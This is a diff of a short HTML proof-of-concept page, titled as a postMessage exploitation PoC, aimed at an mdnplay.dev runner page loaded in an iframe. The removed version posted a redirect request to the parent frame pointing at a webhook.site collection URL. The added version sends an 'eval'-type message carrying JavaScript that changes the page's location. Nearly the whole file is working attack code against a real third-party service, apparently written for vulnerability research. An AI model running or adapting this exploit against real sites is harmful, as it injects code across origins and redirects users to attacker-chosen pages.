@@ -1,15 +1,27 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <h1>Exploitation via postMessage - Redirect PoC</h1>
+
+    <iframe id="targetFrame"
+      src="https://fc356f5a-2c8c-41cb-986a-4f2410e99d7c.mdnplay.dev/runner.html?state=XXXX"
+      style="width: 100%; height: 600px; border: 1px solid black;">
+    </iframe>
+
     <script>
-      // إرسال رسالة إلى الصفحة الأم تطلب redirect
-      window.parent.postMessage(
-        {
-          typ: "redirect",
-          url: "https://webhook.site/dc178026-0966-4143-8ebd-d4ec82a2bd6f"
-        },
-        "*"
-      );
+      const target = document.getElementById('targetFrame').contentWindow;
+
+      window.addEventListener("message", (e) => {
+        console.log("Received from iframe", e.data);
+      });
+
+      // Wait for iframe to load, then send the malicious postMessage
+      setTimeout(() => {
+        target.postMessage({
+          type: 'eval',
+          code: 'location.href="https://example.com";'
+        }, '*');
+      }, 2000);
     </script>
   </body>
 </html>
